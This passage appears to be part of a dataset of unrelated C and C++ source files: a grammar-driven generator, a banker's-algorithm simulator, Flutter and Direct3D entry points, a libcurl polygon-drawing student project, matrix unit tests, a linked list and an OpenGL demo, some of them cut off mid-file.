(this->mp.count(expression[0]) == 0)\n                    {\n                        newnode = this->allocate_node(expression[0], Type::terminal);\n                    }\n                    else\n                    {\n                        newnode = mp[expression[0]];\n                    }\n                    mp[rule.first]->subnode.push_back(newnode);\n                    continue;\n                }\n                Node *optnodes = allocate_node(\"\", Type::expression);\n                for (auto option : expression)\n                {\n                    Node *newnode;\n                    if (this->mp.count(option) == 0)\n                    {\n                        newnode = this->allocate_node(option, Type::terminal);\n                    }\n                    else\n                    {\n                        newnode = mp[option];\n                    }\n                    optnodes->subnode.push_back(newnode);\n                }\n                mp[rule.first]->subnode.push_back(optnodes);\n            }\n        }\n        this->start = mp[\"<start>\"];\n        this->maxdepth = maxdepth;\n        this->getshortcut();\n    }\n\nvoid compile(string file, bool show)\n    {\n        string code = R\"(#include<stdio.h>\n#include<string.h>\n#include<time.h>\n#include<stdlib.h>\n#define next(l)\\\n    seed ^= seed <<13;\\\n    seed ^= seed >>17;\\\n    seed ^= seed <<5;\\\n    branch = seed%l\n\n\n#define BUFFER_SIZE 512*1024*1024\n\n#define extend(c)\\\n    (buffer).data[(buffer).top++] = c;\n\n#define clean()\\\n    buffer.top = 0\n     \n#define printbuff()\\\n    for (int i = 0; i < (buffer).top; i++) { \\\n        putchar(buffer.data[i]); \\\n    } \\\n    putchar('\\n')\n    \ntypedef struct {\n    char data[BUFFER_SIZE];\n    unsigned top;\n} Buffer;\nBuffer buffer;\n\nunsigned branch;\nunsigned cursor;\nunsigned seed;\n)\";\n        code += \"#define MAXDEPTH \" + to_string(this->maxdepth) + \"\\n\";\n        // creat signature\n        for (int i = 0; i < this->nodes.size(); i++)\n        {\n            code += \"void func_\" + to_string(reinterpret_cast<uintptr_t>(mp[nodes[i]->name])) + \"(unsigned depth);\\n\";\n        }\n\n        string functions = \"\";\n        for (int i = 0; i < this->nodes.size(); i++)\n        {\n            string function = \"\";\n            string functionname = \"void func_\" + to_string(reinterpret_cast<uintptr_t>(mp[nodes[i]->name])) + \"(unsigned depth){\\n\";\n            string body = \"\";\n            if (nodes[i]->tp == Type::terminal)\n            {\n                for (int j = 0; j < nodes[i]->name.size(); j++)\n                {\n                    body += \"    extend(\" + to_string((unsigned)nodes[i]->name[j]) + \");\\n\";\n                }\n            }\n            else if (nodes[i]->tp == Type::non_terminal)\n            {\n                body += \"    if(depth>MAXDEPTH){\\n\";\n                for (int j = 0; j < shortcut[nodes[i]].size(); j++)\n                {\n                    body += \"        extend(\" + to_string((unsigned)shortcut[nodes[i]][j]) + \");\\n\";\n                }\n                body += \"        return;\\n\";\n                body += \"    }\\n\";\n                body += \"    next(\" + to_string(nodes[i]->subnode.size()) + \");\\n\";\n                body += \"    switch(branch){\\n\";\n                for (int j = 0; j < nodes[i]->subnode.size(); j++)\n                {\n                    body += \"       case \" + to_string(j) + \":\\n\";\n                    body += \"           func_\" + to_string(reinterpret_cast<uintptr_t>(nodes[i]->subnode[j])) + \"(depth+1);\\n           break;\\n\";\n                }\n                body += \"    }\\n\";\n            }\n            else if (nodes[i]->tp == Type::expression)\n            {\n                // body += \"    if(depth>MAXDEPTH){\\n\";\n                // for (int j = 0; j < shortcut[nodes[i]].size(); j++)\n                // {\n                //     body += \"        extend(\" + to_string((unsigned)shortcut[nodes[i]][j]) + \");\\n\";\n                // }\n                // body += \"        return;\\n\";\n                // body += \"    }\\n\";\n             ",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <string>\n#include <sstream>\n#include <map>\n#include <queue>\n#include <algorithm>\n#include <unistd.h>\n#include <sys/wait.h>\n#include <semaphore.h>\n#include <chrono>\n#include <thread>\n\nusing namespace std;\n\nstruct ResourceType {\n    std::string name;\n    std::vector<std::string> instances;\n};\n\nstruct Process {\n    int pid;\n    int deadline;\n    int computationTime;\n    std::vector<std::string> instructions;\n};\n\nstd::vector<ResourceType> resources;\nstd::map<int, Process> processes;\nsem_t resourceMutex; // Semaphore for resource access\nstd::vector<int> Available; // Available resources\nstd::vector<std::vector<int>> Max; // Maximum demand\nstd::vector<std::vector<int>> Allocation; // Current allocation\nstd::vector<std::vector<int>> Need; // Remaining needs\n\nsem_t mutex; // Semaphore for synchronization\n\nvoid parseResources(const std::string& filename) {\n    std::ifstream file(filename);\n    std::string line;\n    while (getline(file, line)) {\n        std::istringstream iss(line);\n        ResourceType resource;\n        std::getline(iss, resource.name, ':');\n        resource.name = resource.name.substr(resource.name.find_first_not_of(\" R\"), resource.name.npos);\n        std::string instance;\n        while (getline(iss, instance, ',')) {\n            resource.instances.push_back(instance.substr(instance.find_first_not_of(\" \"), instance.npos));\n        }\n        resources.push_back(resource);\n    }\n}\n\nvoid parseProcesses(const std::string& filename) {\n    std::ifstream file(filename);\n    std::string line;\n    Process currentProcess;\n    int processId = 0;\n    while (getline(file, line)) {\n        if (line.find(\"process_\") != std::string::npos) {\n            if (currentProcess.pid != 0) {\n                processes[currentProcess.pid] = currentProcess;\n                currentProcess.instructions.clear();\n            }\n            currentProcess.pid = ++processId;\n        } else if (!line.empty()) {\n            currentProcess.instructions.push_back(line);\n        }\n    }\n    if (currentProcess.pid != 0) {\n        processes[currentProcess.pid] = currentProcess;\n    }\n}\n\nbool isSafe() {\n    std::vector<bool> Finish(Max.size(), false);\n    std::vector<int> Work = Available;\n\n    while (true) {\n        bool found = false;\n        for (int i = 0; i < Max.size(); ++i) {\n            if (!Finish[i]) {\n                bool possible = true;\n                for (int j = 0; j < Available.size(); ++j) {\n                    if (Need[i][j] > Work[j]) {\n                        possible = false;\n                        break;\n                    }\n                }\n                if (possible) {\n                    for (int k = 0; k < Available.size(); ++k)\n                        Work[k] += Allocation[i][k];\n                    Finish[i] = true;\n                    found = true;\n                }\n            }\n        }\n        if (!found) break; // No allocation was possible in this loop iteration\n    }\n\n    // If all processes can finish, the system is in a safe state\n    for (bool f : Finish) if (!f) return false;\n    return true;\n}\n\nbool requestResources(int processId, const std::vector<int>& request) {\n    sem_wait(&mutex); // Begin critical section\n\n    // Check if request can be satisfied\n    for (int i = 0; i < request.size(); ++i) {\n        if (request[i] > Need[processId][i] || request[i] > Available[i]) {\n            sem_post(&mutex); // End critical section\n            return false; // Request cannot be satisfied immediately\n        }\n    }\n\n    // Temporarily allocate requested resources\n    for (int i = 0; i < request.size(); ++i) {\n        Available[i] -= request[i];\n        Allocation[processId][i] += request[i];\n        Need[processId][i] -= request[i];\n    }\n\n    // Check for safe state\n    if (!isSafe()) {\n        // Rollback resources\n        for (int i = 0; i < request.size(); ++i) {\n            Available[i] += request[i];\n            Allocation[processId][i] -= request[i];\n            Need[processId][i] += request[i];\n        }\n        sem_post(&mutex); // End critical section\n        return false; // Request cannot be granted due to unsafe state\n    }\n\n    sem_post(&mutex); // End critical section\n    return true; // Request granted\n}\n\nvoid useResources(int processId, const std::vector<int>& use) {\n    std::cout << \"Using resources for Process \" << processId << \": \";\n    for (size_t i = 0; i < resources.size(); ++i) {\n        const auto& res = resources[i];\n        for (int j = 0; j < use[i]; ++j) {\n            std::cout << res.instances[j] << \" \";\n        }\n    }\n    std::cout << std::endl;\n}\n\nvoid releaseResources(int processId, const std::vector<int>& release) {\n    sem_wait(&mutex); // Begin critical section\n\n    // Release resources\n    for (int i = 0; i < release.size(); ++i) {\n        Available[i] += release[i];\n        Allocation[processId][i] -= release[i];\n        Need[processId][i] += release[i];\n    }\n\n    sem_post(&mutex); // End critic",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"covid\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <Windows.h>\n\n#include \"ndq/rhi.h\"\n#include \"ndq/window.h\"\n\nstruct App : public ndq::IApplication\n{\n    App()\n    {\n        Title = L\"triangle\";\n    }\n\n    void Initialize()\n    {\n        pVertexShaderBlob = ndq::CompileShaderFromFile(L\"vertex.hlsl\", ndq::NDQ_SHADER_TYPE::VERTEX, L\"main\", nullptr, 0);\n        pPixelShaderBlob = ndq::CompileShaderFromFile(L\"pixel.hlsl\", ndq::NDQ_SHADER_TYPE::PIXEL, L\"main\", nullptr, 0);\n        pGraphicsDevice = ndq::GetGraphicsDevice();\n        pCmdList = pGraphicsDevice->GetCommandList(ndq::NDQ_COMMAND_LIST_TYPE::GRAPHICS);\n    }\n\n    void Finalize() {}\n    void Update(float t)\n    {\n        pCmdList->Open();\n        pCmdList->SetVertexShader(pVertexShaderBlob.get());\n        pCmdList->SetPixelShader(pPixelShaderBlob.get());\n        pCmdList->SetPrimitiveTopology(ndq::NDQ_PRIMITIVE_TOPOLOGY::TRIANGLELIST);\n        pCmdList->DrawInstanced(3, 1, 0, 0);\n        pCmdList->Close();\n        pGraphicsDevice->ExecuteCommandList(pCmdList.get());\n    }\n\n    std::shared_ptr<ndq::IGraphicsDevice> pGraphicsDevice;\n    std::shared_ptr<ndq::ICommandList> pCmdList;\n    std::shared_ptr<ndq::IShader> pVertexShaderBlob;\n    std::shared_ptr<ndq::IShader> pPixelShaderBlob;\n};\n\nint APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)\n{\n    App MyApp;\n    return MyApp.Run();\n}",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <graphics.h>\r\n#include <math.h>\r\n#include <curl/curl.h>\r\n\r\nsize_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream); // curl \r\nvoid eksenciz(); // 2 boyutlu uzay duzlemini cizdiriyoruz\r\nchar* parcala(const char* str); //alinan verinin kullanilacak kismini belirliyor  \r\nint* sayilastir(char *a); //stringi integera ceviriyor\r\nint sekilsayisi(int* sayilar, int boyut,int *ay); // veride kac sekil oldugunu belirliyor\r\nvoid alanVeKareSayisiYazdir(int* coordinates, int size, float *topl,int* bks); // Alan ve Plartform degerlerini buluyor\r\nconst char* satir(const char* text, int line_number); // gelen veride secilen satiri donduruyor\r\nbool icindemi(int* polygon, int n, int x, int y); // birim karenin icersinde poligon bulunup bulunmadigini kontrol ediyor\r\nvoid platformbelirleme(int* polygon, int n); // plartformun oldugu kareleri griye boyuyor\r\nint platformSayisi(int* polygon, int n); // plartform sayisini donduruyor\r\n\r\nint main()\r\n{\r\n\t//Curl islemleri\r\n\tFILE *dosya;\r\n    CURL *curl;\r\n    CURLcode res;\r\n    long file_size;\r\n    int secim;\r\n\tfloat pMal; //plartform maliyeti\r\n\tint sMal; // sondaj maliyeti\r\n    curl = curl_easy_init();\r\n\r\n    if (curl) {\r\n        curl_easy_setopt(curl, CURLOPT_URL, \"http://abilgisayar.kocaeli.edu.tr/prolab1/prolab1.txt\");\r\n\r\n        dosya = fopen(\"yaz1.txt\", \"wb\");\r\n        if (!dosya) {\r\n            fprintf(stderr, \"Dosya a\u00e7ma hatas\u00fd\\n\");\r\n            return 1;\r\n        }\r\n\r\n        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);\r\n        curl_easy_setopt(curl, CURLOPT_WRITEDATA, dosya);\r\n\r\n        res = curl_easy_perform(curl);\r\n        fclose(dosya);\r\n\r\n        if (res != CURLE_OK) {\r\n            fprintf(stderr, \"cURL hatas\u00fd: %s\\n\", curl_easy_strerror(res));\r\n            curl_easy_cleanup(curl);\r\n            return 1;\r\n        }\r\n\t\tdosya = fopen(\"yaz1.txt\", \"r\");\r\n        fseek(dosya, 0, SEEK_END);\r\n        file_size = ftell(dosya);\r\n        rewind(dosya);\r\n\r\n        char metin[file_size + 1];\r\n        fread(metin, 1, file_size, dosya);\r\n        metin[file_size] = '\\0'; \r\n\t\tprintf(\"Cekilen veri:\\n%s\\n\\n\",metin);\r\n\t\t\r\n        printf(\"Hangi satiri cizdirmek istersiniz:\");\r\n        scanf(\"%d\", &secim);\r\n        \r\n        printf(\"\\nBirim Sondaj Maliyetini Giriniz (1-10):\");\r\n        scanf(\"%d\",&sMal);\r\n        \r\n        printf(\"\\nBirim Plartform Maliyetini Giriniz:\");\r\n        scanf(\"%f\",&pMal);\r\n        \r\n        const char* input_str = satir(metin, secim); // verideki secilen satiri input_str ye esitliyoruz \r\n\t\tprintf(\"\\nSecilen satir: %s\\n\", input_str);\r\n\t\r\n\t// input islemleri\r\n\tchar* dnm = parcala(input_str); // kullanilacak veriyi dnm ye esitle \r\n\tint* coord = sayilastir(dnm); // koordinat noktalarini integer sekilde coorda esitliyoruz\r\n\t\r\n\tint boyut= 0;\r\n\tfor(int i=0;coord[i] != '\\0';i++)\r\n\t{\r\n\t\tboyut++; // boyut bilgisi\r\n\t}\r\n\tfor(int i=0;coord[i] != '\\0';i++)\r\n\t{\r\n\t\tcoord[i] = coord[i] *16; // cizdirdi\u00f0imiz eksenin boyutlar\u00fdna uygun pikseldeki noktayi bulmak i\u00e7in 16 ile carpiyoruz \r\n\t}\r\n\tinitwindow(1920,1080); // pencere ac\r\n\tint ayrim; // iki sekil varsa ayrim indeksnin temsil eder\r\n\teksenciz();\r\n\tif(sekilsayisi(coord,boyut,&ayrim))\r\n\t{ \r\n\t\t//Tek Sekil varsa\r\n\tfloat toplmal=0;\r\n\tint birimks;\r\n \tsetfillstyle(1, RED);\r\n    fillpoly(boyut/2, coord);\r\n    alanVeKareSayisiYazdir(coord, boyut, &toplmal,&birimks);\r\n    platformbelirleme(coord, boyut);\r\n    \r\n    printf(\"\\nToplam Plartform Sayisi:%d\\n\",birimks);\r\n    \r\n    printf(\"\\nToplam Sondaj Maliyeti: %.2f\\n\", (float(sMal) * toplmal /10.0));\r\n    \r\n\tprintf(\"\\nToplam Plartform Maliyeti: %.2f\\n\", (pMal * float(birimks)));\r\n\t\r\n\tprintf(\"\\nToplam Maliyet: %.2f\\n\",((float(sMal) * toplmal /10.0) + (pMal * float(birimks))));\r\n\t\r\n\tprintf(\"\\nKar Miktari: %.2f\\n\", toplmal - ((float(sMal) * toplmal /10.0) + (pMal * float(birimks))));  \t\r\n\t\t\r\n\tsetfillstyle(1, RED);\r\n    fillpoly(boyut/2, coord);\r\n     \tchar floatStr[20];\r\n   \t \tsprintf(floatStr, \"%.2f\", toplmal);\r\n        \r\n        outtextxy(500, 20, \"Toplam Rezerv Deger:\");\r\n   \t\touttextxy(680, 20, floatStr);\r\n\t}\r\n\telse\r\n\t{\r\n\t\t// cift sekil varsa\r\n\t\tint* sekil1 = (int*)malloc((ayrim+2)* sizeof(int)); // sekil1 in koordinatlari icim bellekte alan tuttuk\r\n\t\tint* sekil2 = (int*)malloc( (boyut - ayrim)* sizeof(int)); //sekil2 nin koordinatlari icin bellekte alan tuttuk\r\n\t\tfloat toplam_alan = 0.0;\r\n\t\tfloat tAlan= 0.0;\r\n\t\tint i=0;\r\n\t\tint boyut1=0;\r\n\t\tint boyut2=0;\r\n\t\tint tPLart = 0; //toplam plartform sayisini verecek\r\n\t\tint toplam_plartf;\r\n\t\tfor(i=0;i <= ayrim;i++)\r\n\t\t{\r\n\t\t\tsekil1[i] = coord[i];\r\n\t\t\tboyut1++;\r\n\t\t}\r\n\t\tsekil1[i+1] = '\\0';\r\n\t\tfor(;coord[i] != '\\0';i++)\r\n\t\t{\r\n\t\t\tsekil2[boyut2] = coord[i];\r\n\t\t\tboyut2++;\r\n\t\t}\r\n\t\tsekil2[boyut2+1] = '\\0';\r\n\t\tsetfillstyle(1, RED);\r\n        fillpoly(boyut1/ 2, sekil1);\r\n        fillpoly(boyut2/ 2, sekil2);\r\n        //ilk sekilin kareleri\r\n        \r\n        alanVeKareSayisiYazdir(sekil1, boyut1,&toplam_alan,&toplam_plartf);\r\n        tAlan += toplam_alan;\r\n        t",
    "#include \"Walnut/Application.h\"\n#include \"Walnut/EntryPoint.h\"\n\n#include \"Walnut/Image.h\"\n#include \"Walnut/Random.h\"\n#include \"Walnut/Timer.h\"\n\nclass ExampleLayer : public Walnut::Layer\n{\npublic:\n\tvirtual void OnUIRender() override\n\t{\n\t\tImGui::Begin(\"Settings\");\n\t\tImGui::Text(\"Last Render %.3fms\", m_LastRenderTime);\n\t\tif (ImGui::Button(\"Render\"))\n\t\t{\n\t\t\tRender();\n\t\t}\n\t\tImGui::End();\n\n\t\tImGui::PushStyleVar(ImGuiStyleVar_WindowPadding,ImVec2(0.0f, 0.0f));\n\t\tImGui::Begin(\"ViewPort\");\n\t\tm_ViewportWidth = ImGui::GetContentRegionAvail().x;\n\t\tm_ViewportHeight = ImGui::GetContentRegionAvail().y;\n\t\t\n\t\tif (m_Image)\n\t\t{\n\t\t\tImGui::Image(\n\t\t\t\tm_Image->GetDescriptorSet(), { (float)m_Image->GetWidth(), (float)m_Image->GetHeight() });\n\t\t\n\t\t}\n\t\t\n\t\tImGui::End();\n\t\tImGui::PopStyleVar();\n\n\t\tRender();\n\t}\n\n\tvoid Render()\n\t{\n\t\tWalnut::Timer timer;\n\t\tif (m_Image == NULL || m_ViewportWidth != m_Image->GetWidth() || m_ViewportHeight != m_Image->GetHeight() )\n\t\t{\n\t\t\tm_Image = std::make_shared<Walnut::Image>(m_ViewportWidth, m_ViewportHeight, Walnut::ImageFormat::RGBA);\n\t\t\tdelete[] m_ImageData;\n\t\t\tm_ImageData = new uint32_t[m_ViewportWidth * m_ViewportHeight];\n\t\t}\n\n\t\tfor (int i = 0; i < m_ViewportWidth * m_ViewportHeight; i++)\n\t\t{\n\t\t\tm_ImageData[i] = Walnut::Random::UInt();\n\t\t\tm_ImageData[i] |= 0xff000000;\t\n\t\t}\n\t\t\n\t\tm_Image->SetData(m_ImageData);\n\n\t\tm_LastRenderTime = timer.ElapsedMillis();\n\n\t}\nprivate:\n\tstd::shared_ptr<Walnut::Image> m_Image;\n\tuint32_t* m_ImageData = nullptr;\n\tuint32_t m_ViewportWidth = 0, m_ViewportHeight;\n\tfloat m_LastRenderTime = 0;\n\t\n};\n\nWalnut::Application* Walnut::CreateApplication(int argc, char** argv)\n{\n\tWalnut::ApplicationSpecification spec;\n\tspec.Name = \"KupoNut\";\n\n\tWalnut::Application* app = new Walnut::Application(spec);\n\tapp->PushLayer<ExampleLayer>();\n\tapp->SetMenubarCallback([app]()\n\t{\n\t\tif (ImGui::BeginMenu(\"File\"))\n\t\t{\n\t\t\tif (ImGui::MenuItem(\"Exit\"))\n\t\t\t{\n\t\t\t\tapp->Close();\n\t\t\t}\n\t\t\tImGui::EndMenu();\n\t\t}\n\t});\n\treturn app;\n}",
    "/******************************************************************************\n\nProblem\nMonk is a multi-talented person, and prepares results for his college in his free time. (Yes, he is still in love with his old college!) He gets a list of students with their marks. The maximum marks which can be obtained in the exam is 100.\n\nThe Monk is supposed to arrange the list in such a manner that the list is sorted in decreasing order of marks. And if two students have the same marks, they should be arranged in lexicographical manner.\n\nHelp Monk prepare the same!\n\nInput format:\nOn the first line of the standard input, there is an integer N, denoting the number of students. N lines follow, which contain a string and an integer, denoting the name of the student and his marks.\n\nOutput format:\nYou must print the required list.\n\nConstraints:\n1 <= N <= 105\n1 <= | Length of the name | <= 100\n1 <= Marks <= 100\n\nSample Input\n3\nEve 78\nBob 99\nAlice 78\n\nSample Output\nBob 99\nAlice 78\nEve 78\n\n*******************************************************************************/\n#include <bits/stdc++.h>\nusing namespace std;\n\nint main()\n{\n    map<int,multiset<string>> mp;\n    int n;\n    cin >> n;\n    while(n--){\n        int marks;\n        string name;\n        cin >> name >> marks;\n        mp[marks].insert(name);   // -1 mul willl make sure the larger numbers are sorted first since it is smaller\n    }\n    // for(auto res: mp){\n    //     auto &mrk = res.first;  // This will get the key (int)\n    //     auto &lis = res.second; // This will get the value which is a multiset\n    //     for(auto val: lis) \n    //         cout <<val << \" \" << -1*mrk<<endl; // while prinitn we can mul with -1 again to get the positive output\n    // }\n    auto cur_it = --mp.end();\n    while(true){\n        auto &stu = (*cur_it).second;\n        auto &mar = (*cur_it).first;\n        for(auto stds : stu)\n            cout << stds << \" \" << mar << endl; \n        if(cur_it != mp.begin())\n            cur_it--;\n        else\n            break;\n    }\n    \n    return 0;\n}\n",
    "#include \"single_thread_matrix_calculation.h\"\n\n#include <gtest/gtest.h>\n\n#include <cmath>\n\n#include \"matrix.h\"\n\nnamespace mca {\nnamespace test {\nclass TestSinglThreadCalculation : public testing::Test {\nprotected:\n    Matrix<> one, negOne, output, a, b, c, d, sym, antisym;\n    Matrix<int> e;\n\n    void SetUp() override {\n        one     = Matrix<>({3, 3}, 1);\n        negOne  = Matrix<>({3, 3}, -1);\n        a       = Matrix<>({{0, 0, 0}, {1, 1, 1}, {2, 2, 2}});\n        b       = Matrix<>({{1, 0, 0}, {0, 1, 0}, {0, 0, 1}});\n        c       = Matrix<>({{1, 2, 3}, {4, 5, 6}, {7, 8, 9}});\n        d       = Matrix<>({{0, 0, 0}, {1, 1, 1}, {2, 2, 2}});\n        e       = Matrix<int>({{1, 2, 3}, {2, 3, 4}, {6, 6, 6}});\n        sym     = Matrix<>({{1, 2. / 3, 3. / 5}, {4. / 6, 3, 8. / 6}, {1.5 / 2.5, 4. / 3, 5}});\n        antisym = Matrix<>({{1, -2. / 3, -3. / 5}, {4. / 6, 3, -8. / 6}, {1.5 / 2.5, 4. / 3, 5}});\n    }\n\n    void TearDown() override {}\n};\n\nTEST_F(TestSinglThreadCalculation, powNumberWholeMatrix) {\n    output = Matrix<>({3, 3}, 0);\n    powNumberSingleThread(a, 2, output, 0, 0, a.getShape());\n    Matrix<> result = Matrix<>({{0, 0, 0}, {1, 1, 1}, {4, 4, 4}});\n    std::cout << output.rows() << output.columns() << std::endl;\n    std::cout << result.rows() << result.columns() << std::endl;\n    ASSERT_TRUE(equalSingleThread(output, result, 0, 0, output.getShape()));\n}\n\nTEST_F(TestSinglThreadCalculation, powNumberSubMatrix) {\n    output = Matrix<>({3, 3}, -1);\n    powNumberSingleThread(c, 2, output, 0, 1, {2, 2});\n    Matrix<> result = Matrix<>({{-1, 4, 9}, {-1, 25, 36}, {-1, -1, -1}});\n    ASSERT_TRUE(equalSingleThread(output, result, 0, 0, output.getShape()));\n}\n\nTEST_F(TestSinglThreadCalculation, numberPowWholeMatrix) {\n    output = Matrix<>({3, 3}, 0);\n    numberPowSingleThread(2, a, output, 0, 0, a.getShape());\n    Matrix<> result = Matrix<>({{1, 1, 1}, {2, 2, 2}, {4, 4, 4}});\n    ASSERT_TRUE(equalSingleThread(output, result, 0, 0, output.getShape()));\n}\n\nTEST_F(TestSinglThreadCalculation, numberPowSubMatrix) {\n    output = Matrix<>({3, 3}, -1);\n    numberPowSingleThread(2, c, output, 0, 1, {2, 2});\n    Matrix<> result({{-1, 4, 8}, {-1, 32, 64}, {-1, -1, -1}});\n    ASSERT_TRUE(equalSingleThread(output, result, 0, 0, output.getShape()));\n}\n\nTEST_F(TestSinglThreadCalculation, lessWholeMatrix) {\n    ASSERT_TRUE(lessSingleThread(a, c, 0, 0, a.getShape()));\n    ASSERT_FALSE(lessSingleThread(a, b, 0, 0, a.getShape()));\n}\n\nTEST_F(TestSinglThreadCalculation, lessSubMatrix) {\n    ASSERT_TRUE(lessSingleThread(a, c, 1, 0, {2, 3}));\n    ASSERT_FALSE(lessSingleThread(a, b, 1, 0, {2, 2}));\n}\n\nTEST_F(TestSinglThreadCalculation, equalWholeMatrix) {\n    ASSERT_TRUE(equalSingleThread(a, d, 0, 0, a.getShape()));\n    ASSERT_FALSE(equalSingleThread(a, b, 0, 0, a.getShape()));\n}\n\nTEST_F(TestSinglThreadCalculation, equalSubMatrix) {\n    ASSERT_TRUE(equalSingleThread(a, d, 1, 0, {2, 2}));\n    ASSERT_FALSE(equalSingleThread(a, b, 1, 0, {2, 2}));\n}\n\nTEST_F(TestSinglThreadCalculation, lessEqualWholeMatrix) {\n    ASSERT_TRUE(lessEqualSingleThread(a, c, 0, 0, a.getShape()));\n    ASSERT_TRUE(lessEqualSingleThread(a, d, 0, 0, a.getShape()));\n    ASSERT_FALSE(lessEqualSingleThread(c, b, 0, 0, a.getShape()));\n}\n\nTEST_F(TestSinglThreadCalculation, lessEqualSubMatrix) {\n    ASSERT_TRUE(lessEqualSingleThread(a, c, 0, 0, {2, 3}));\n    ASSERT_TRUE(lessEqualSingleThread(a, d, 0, 0, {2, 3}));\n    ASSERT_FALSE(lessEqualSingleThread(c, a, 0, 0, {2, 3}));\n}\n\nTEST_F(TestSinglThreadCalculation, greaterWholeMatrix) {\n    ASSERT_TRUE(greaterSingleThread(c, a, 0, 0, c.getShape()));\n    ASSERT_FALSE(greaterSingleThread(d, a, 0, 0, d.getShape()));\n    ASSERT_FALSE(greaterSingleThread(d, b, 0, 0, b.getShape()));\n}\n\nTEST_F(TestSinglThreadCalculation, greaterSubMatrix) {\n    ASSERT_TRUE(greaterSingleThread(c, a, 0, 1, {2, 2}));\n    ASSERT_FALSE(greaterSingleThread(a, b, 0, 1, {2, 2}));\n    ASSERT_FALSE(greaterSingleThread(a, d, 0, 1, {2, 2}));\n}\n\nTEST_F(TestSinglThreadCalculation, greaterEqualWholeMatrix) {\n    ASSERT_TRUE(greaterEqualSingleThread(a, d, 0, 0, a.getShape()));\n    ASSERT_TRUE(greaterEqualSingleThread(c, a, 0, 0, c.getShape()));\n    ASSERT_FALSE(greaterEqualSingleThread(b, c, 0, 0, b.getShape()));\n}\n\nTEST_F(TestSinglThreadCalculation, greaterEqualSubMatrix) {\n    ASSERT_TRUE(greaterEqualSingleThread(a, d, 0, 1, {3, 2}));\n    ASSERT_TRUE(greaterEqualSingleThread(c, b, 0, 1, {3, 2}));\n    ASSERT_FALSE(greaterEqualSingleThread(b, c, 0, 1, {3, 2}));\n}\n\nTEST_F(TestSinglThreadCalculation, notEqualWholeMatrix) {\n    ASSERT_TRUE(notEqualSingleThread(a, c, 0, 0, a.getShape()));\n    ASSERT_FALSE(notEqualSingleThread(a, d, 0, 0, a.getShape()));\n}\n\nTEST_F(TestSinglThreadCalculation, notEqualSubMatrix) {\n    ASSERT_TRUE(notEqualSingleThread(a, c, 1, 1, {2, 1}));\n    ASSERT_FALSE(notEqualSingleThread(a, d, 1, 1, {2, 1}));\n}\n\nTEST_F(TestSinglThreadCalculation, addNumberWholeMatrix) {\n    output = Matrix<>({3, 3}, -1);\n    addSingleThread(2, a, output, 0, 0, a.",
    "#include <iostream>\n\nusing namespace std;\n\n// Node class for a doubly linked list\nclass Node {\npublic:\n    int data;\n    Node* next;\n    Node* prev;\n    \n    // Constructor\n    Node(int value) {\n        data = value;\n        next = nullptr;\n        prev = nullptr;\n    }\n};\n\n// Doubly linked list class\nclass DoublyLinkedList {\nprivate:\n    Node* head;\n    Node* tail;\npublic:\n    // Constructor\n    DoublyLinkedList() {\n        head = nullptr;\n        tail = nullptr;\n    }\n    \n    // Function to insert a node at the end of the list\n    void insertEnd(int value) {\n        Node* newNode = new Node(value);\n        if (head == nullptr) {\n            head = newNode;\n            tail = newNode;\n        } else {\n            tail->next = newNode;\n            newNode->prev = tail;\n            tail = newNode;\n        }\n    }\n    \n    // Function to display the list\n    void display() {\n        Node* current = head;\n        while (current != nullptr) {\n            cout << current->data << \" \";\n            current = current->next;\n        }\n        cout << endl;\n    }\n};\n\nint main() {\n    DoublyLinkedList dll;\n    dll.insertEnd(1);\n    dll.insertEnd(2);\n    dll.insertEnd(3);\n    dll.insertEnd(4);\n    \n    cout << \"Doubly linked list: \";\n    dll.display();\n    \n    return 0;\n}\n",
    "//\n// Created by ivan on 2024/5/4.\n//\n#include <GL.hpp>\n#include <Shader.hpp>\n#include <StbImage.hpp>\n#include <spdlog/spdlog.h>\n\nint main() {\n    spdlog::set_level(spdlog::level::debug);\n\n    lgl::GL gl;\n\n    lgl::Shader shader;\n    shader.add(lgl::Shader::Type::Vertex, \"./vertexShader.glsl\");\n    shader.add(lgl::Shader::Type::Fragment, \"./fragShader.glsl\");\n    shader.link();\n\n    std::vector<float> vertices{\n        -0.5f, -0.5f, -0.5f,  0.0f, 0.0f,\n         0.5f, -0.5f, -0.5f,  1.0f, 0.0f,\n         0.5f,  0.5f, -0.5f,  1.0f, 1.0f,\n         0.5f,  0.5f, -0.5f,  1.0f, 1.0f,\n        -0.5f,  0.5f, -0.5f,  0.0f, 1.0f,\n        -0.5f, -0.5f, -0.5f,  0.0f, 0.0f,\n\n        -0.5f, -0.5f,  0.5f,  0.0f, 0.0f,\n         0.5f, -0.5f,  0.5f,  1.0f, 0.0f,\n         0.5f,  0.5f,  0.5f,  1.0f, 1.0f,\n         0.5f,  0.5f,  0.5f,  1.0f, 1.0f,\n        -0.5f,  0.5f,  0.5f,  0.0f, 1.0f,\n        -0.5f, -0.5f,  0.5f,  0.0f, 0.0f,\n\n        -0.5f,  0.5f,  0.5f,  1.0f, 0.0f,\n        